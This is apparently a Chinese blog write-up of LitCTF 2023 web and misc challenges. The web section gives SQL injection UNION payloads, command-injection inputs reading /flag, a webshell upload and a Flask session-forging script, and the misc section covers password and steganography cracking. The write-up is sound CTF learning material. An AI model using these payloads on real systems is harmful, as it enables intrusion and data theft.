---
title: LitCTF 2023 
description: web&misc wp
tags:
  - CTF
  - MISC
  - WEB
categories:
  - write up
cover: 'https://tuchuang.voooe.cn/images/2024/03/19/68c49a2c1d9240fd8d787de5920b7a06.webp'
abbrlink: LitCTF2023[1]
date: 2024-03-07 14:50:00
---
官方wp：[https://dqgom7v7dl.feishu.cn/docx/VyLmdhKDOou5E8xruA7c8bSInKf](https://dqgom7v7dl.feishu.cn/docx/VyLmdhKDOou5E8xruA7c8bSInKf)
## web

### 我 Flag 呢？

查询源代码

![](https://s2.loli.net/2024/03/07/b2iuLVK4tFAOrGC.png)

**NSSCTF{35a119e1-89cf-4133-88d0-61a81d8303f5}**


### **彩蛋 1：**

![](https://s2.loli.net/2024/03/07/bJHSUI8fMvWD5E3.png)

**LitCTF{First_t0_The_k3y! (1/?)**


### 导弹迷踪

**找到game.js，代码过第六关的时候会弹出flag，flag泄露**


![](https://s2.loli.net/2024/03/07/82dOI7bArWaYjwV.png)

**flag{y0u_w1n_th1s_!!!}**


### Follow me and hack me

  get     post   备份文件



![](https://s2.loli.net/2024/03/07/B76D5tG4FXRWcem.png)

**NSSCTF{64b164d6-78e9-4fff-b0a6-51804ca156d7}**


### 彩蛋 3:

![](https://s2.loli.net/2024/03/07/k5YLineldhPUFSt.png)

**dirsearch走一波**

![](https://s2.loli.net/2024/03/07/RPZJr3A2vw5uhme.png)

**url/www.zip   下载文件**

![](https://s2.loli.net/2024/03/07/zMZmHvISpWkjAht.png)

**文本打开bak文件**

![](https://s2.loli.net/2024/03/07/FRqCP62IHBgNhwX.png)

**_R3ady_P14yer_000ne_(3/?)**

> ps:这里 cookie 要等于 flag 的，但是我火狐没开 cookie 就跳过了好像，直接出 flag 了。0.0


### PHP 是世界上最好的语言！！（wp 复现）

![](https://s2.loli.net/2024/03/07/CyIzaXEVMblSPvU.png)

**system('cat /flag');**

**NSSCTF{28ceaa6e-ec30-4105-9f80-07148c37f547}**

> 受不了一点


###   Vim yyds

> **vim 在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生.swo**
> URL/index.php.swp  或者  .index.php.swp      下载缓存文件

**这里/.index.php.swp下载文件**

![](https://s2.loli.net/2024/03/07/SsMCV15jT6zcZBe.png)

**紧接放入vim看看
口令：vim xxx.swp**

![](https://s2.loli.net/2024/03/07/zXljEUDQb92vOVP.png)

**看不到啥东西，试试直接记事本打开看看**

![](https://s2.loli.net/2024/03/07/h4BTlrwCH3Qcogn.png)

**有php代码，看看逻辑
POST一个参数cmd，cmd的值将作为系统命令执行
POST一个参数password，它的值进行base64编码后要强等于它的值
并且告诉我们值为Give_Me_Your_Flag**

![](https://s2.loli.net/2024/03/07/H8PBLRNaQIdMFs4.png)

**构造cmd=cat /flag 得到flag**

**NSSCTF{2b0de9e7-8e90-411a-8659-4ad5ede0a36e}**


### 作业管理系统

文件上传，一句话木马



![](https://s2.loli.net/2024/03/07/AKEOI7N9unp6f4o.png)

**源代码注释处发现用户名和密码**
**用户名：admin，密码：admin 登录**

![](https://s2.loli.net/2024/03/07/B3LEDe9Y7mIktxS.png)

**上传一句话木马文件进去**

![](https://s2.loli.net/2024/03/07/d9tFzoHTNLK3VJc.png)

![](https://s2.loli.net/2024/03/07/Q5jzbusxPDZwp94.png)

**进入一句话木马文件内，然后运行口令即可**

**NSSCTF{2d63a23c-8552-48d1-b029-61a727e60845} **


### 彩蛋 2：

![](https://s2.loli.net/2024/03/07/jWq51eacJwDdr3T.png)

**进入https://github.com/ProbiusOfficial/My_pic/blob/main/demo.jpg**

![](https://s2.loli.net/2024/03/07/V8xyM6zOwN2dbST.png)

**_S0_ne3t? (2/?)**


### 这是什么？SQL ！注一下 ！（wp 复现）

 sql 手工注入



![](https://s2.loli.net/2024/03/07/Z9ImsUA3qHWb4Sg.png)

Get 一个参数 id，给出源码，闭环为 6 个）

题目给出了列名是 username,password 两个，所以我们也不需要用 Order by 去爆破列名了

爆破顺序：列数 > 库 > 表 > 列(字段)

列：column，库：schema，表：table

`爆库:?id=1)))))) union select 1,group_concat(schema_name) from information_schema.schemata --+`

![](https://s2.loli.net/2024/03/07/nBcPotblrLgGCMY.png)

复现只看 flag 的库：ctftraining

`爆表:?id=1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' --+`

![](https://s2.loli.net/2024/03/07/5IJyrtN7u2aDkiT.png)

`爆列：?id=1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema = 'ctftraining' --+`

![](https://s2.loli.net/2024/03/07/Q7w6esVGjJcdnOf.png)

**得知flag列在ctftraining库的flag表中，那么将这个列的信息抓出来看看**

![](https://s2.loli.net/2024/03/07/53rMjSlQKUtveYq.png)

**NSSCTF{3dbfe5bc-0522-4019-aabb-0281184cbf45} **

### 彩蛋 4：

**搜索2就行**

![](https://s2.loli.net/2024/03/07/8dpgRIN5hy4KnvH.png)

**F1rst_to_Th3_eggggggggg!**

###   Http pro max plus（wp 复现）

1. Client-ip: 127.0.0.1 伪造本地访问
2. Referer: pornhub.com 伪造来源网址
3. User-Agent: Chrome 伪造使用的浏览器
4. via: Clash.win 伪造代理服务器地址

![](https://s2.loli.net/2024/03/07/WKb7rxtzkf8jJHd.png)

访问/wtfwtfwtfwtf.php

![](https://s2.loli.net/2024/03/07/4VsljWEr9xvTXKn.png)

按钮都是无用项，在源码注释处找到 hint

![](https://s2.loli.net/2024/03/07/96zqoNiRKejM1hD.png)

**访问/sejishikong.php**

![](https://s2.loli.net/2024/03/07/GEqzmUBw8ldPIZ3.png)

**NSSCTF{82fca04a-f925-4382-bff5-4fea98e39196}**

### Ping

**这里展示    ； --->  %3B
‘cmd1;cmd2   无论前面执行是否成功后面都继续执行’**

![](https://s2.loli.net/2024/03/07/npAx4zH65G2wu8K.png)

**NSSCTF{53ee44eb-716a-4534-90ce-3a6562e1ec91}**

> PS：
> 当完成某个条件后能够直接弹出 flag，说明 flag 的展示逻辑已经在服务器端实现了，完成条件会触发服务器端返回 flag 的响应。
> 而当使用 Burp Suite 抓包并发送请求时才能找到 flag，可能是因为 flag 的展示逻辑被实现在客户端的 JavaScript 代码中，而不是服务器端。在这种情况下，完成条件只是触发了客户端的 JavaScript 代码执行，然后根据返回的数据进行处理展示。因此，通过使用 Burp Suite 抓包并修改请求，可以在发送给服务器之前修改请求中的参数，使得服务器返回 flag。

### 1zjs

![](https://s2.loli.net/2024/03/07/6GwXYA1NhO4salk.png)

**Your gift just take it : /f@k3f1ag.php
访问http://node2.anna.nssctf.cn:28116/f@k3f1ag.php**

![](https://s2.loli.net/2024/03/07/Yd7DIfBx9RbP6M2.png)

**全选放控制台**

![](https://s2.loli.net/2024/03/07/MJsZTFml2Q3f5bq.png)

**NSSCTF{9b94a89d-ed34-481e-ba8c-b89f9e757a86}**

### 彩蛋

**彩蛋分布于 我Flag呢 Follow me and hack me 作业管理系统 狠狠的注入 四个题目 中**

**LitCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_P14yer_000ne_F1rst_to_Th3_eggggggggg!}**

###   就当无事发生

   gitcommit，github 历史记录



![](https://s2.loli.net/2024/03/07/Sgb3TZ26Rd4s9DQ.png)

**访问博客****

![](https://s2.loli.net/2024/03/07/FqJZN39jWiyDSBR.png)

**点进第一个博客**

![](https://s2.loli.net/2024/03/07/g8vYePXDl2kI6N7.png)

**根据wp思路，前往github直接搜索ProbiusOfficial.github.io**

![](https://s2.loli.net/2024/03/07/MtjH1G6CDcFhQIy.png)

![](https://s2.loli.net/2024/03/07/unGdtvXPpRr3FNc.png)

![](https://s2.loli.net/2024/03/07/7JrDEm6MLqhiT9G.png)

**这两个都可以，一个是原本，一个是删除flag的，但是操作记录保留了**

![](https://s2.loli.net/2024/03/07/1bqt8ipGhjQLyIf.png)

**LitCTF{g1thub_c0mmit_1s_s0_us3ful}**

### Flag 点击就送！

伪造 session



密钥：'LitCTF'
工具：**flask-unsign **

脚本：

```python
import requests
import string
import subprocess

SECRET_KEY = "LitCTF"

cmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{\'name\': \'admin\'}', '--secret', SECRET_KEY])

cookie = {'session' : cmd_out.decode().rstrip()}
response = requests.get('http://node5.anna.nssctf.cn:28403/flag', cookies=cookie)

print(response.text)
```

![](https://s2.loli.net/2024/03/07/pn9yrhMD2tN8fgo.png)

**NSSCTF{d971096e-fa62-43a7-be60-70acbd180d12}**

## misc


### What_1s_BASE

base64

![](https://s2.loli.net/2024/03/07/1EsHaVCe2hPdpnk.png)

![](https://s2.loli.net/2024/03/07/qA549EdcaQBPsFN.png)

**LitCTF{KFC_Cr4zy_Thur3day_V_me_50}**


### Take me hand

流量分析

**wireshark打开，Ctrl+F 按图示设置搜索flag**

![](https://s2.loli.net/2024/03/07/H5xoG6R8eXbnUBr.png)

**LitCTF{Give_y0ur_hand_to_me!!!_****plz****}**


### 404notfound

图片隐写

**010 Editor打开，搜索litctf**

![](https://s2.loli.net/2024/03/07/Gb7cYEsT3IQimOp.png)

**LitCTF{Its_404_but_1ts_n0t_a_page}**


### 喜欢我的压缩包么

   弱口令密码爆破



![](https://s2.loli.net/2024/03/07/w9oNm5bYp7H8iAI.png)

![](https://s2.loli.net/2024/03/07/INv3ZOL6WCAeXuG.png)

**使用ziperello工具，6位数字爆破**

![](https://s2.loli.net/2024/03/07/MbFRVT6EYWdHtQc.png)

**密码：114514   输入解压**

![](https://s2.loli.net/2024/03/07/wYcx2bPInCZWKJ6.png)

**LitCTF{Do-u-like-my-zip-p4ck?}**


### 这羽毛球怎么只有一半啊

图片隐写（宽高）



![](https://s2.loli.net/2024/03/07/d73n9SPRIfCwqJA.png)

**05改改06 07还差点，08就够高了**

> **06 33 的 06 是宽度**
> **07 dc 的 07 是高度**

![](https://s2.loli.net/2024/03/07/QwNT6jVxhoYfZRM.png)

**LitCTF{Fl4g_0fcourse!}**

> 比赛时用工具 CRC 计算一把梭


### 破损的图片

[文件头及其十六进制](https://blog.csdn.net/BlueDoorZz/article/details/102797887)



**根据题目猜测为 png 图片**

![](https://s2.loli.net/2024/03/07/jMi3mIFgXnKZtbe.png)

![](https://s2.loli.net/2024/03/07/yQBWUglmJ1Dk8hn.png)

**补充七位文件头：89 50 4E 47 0D 0A 1A 0A
保存，修改后缀名为.png后打开**

![](https://s2.loli.net/2024/03/07/iBHmuxk2XUbK5tq.png)

**LitCTF{May you, the beauty of this world, always shine.}**


### ssvvgg

svg 格式，base64 转文件，steghide 爆破


![](https://s2.loli.net/2024/03/07/v39IDEdWMOTjaG7.png)

**打开看到源码处有base64编码，提取出来**

![](https://s2.loli.net/2024/03/07/1z5eAfVkroZgFcE.png)

**放入在线网站转换**

![](https://s2.loli.net/2024/03/07/5n2rJGd4lYWCaMe.png)

**保存jpg文件，010查看**

![](https://s2.loli.net/2024/03/07/wXZoLMEJWHGcYUF.png)

**保存jpg文件到kali，steghide本身没有爆破功能，这里使用stegseek爆破**

![](https://s2.loli.net/2024/03/07/h5smzlXuqkSriN8.png)

**LitCTF{svg?_base642png!&steghide!}**
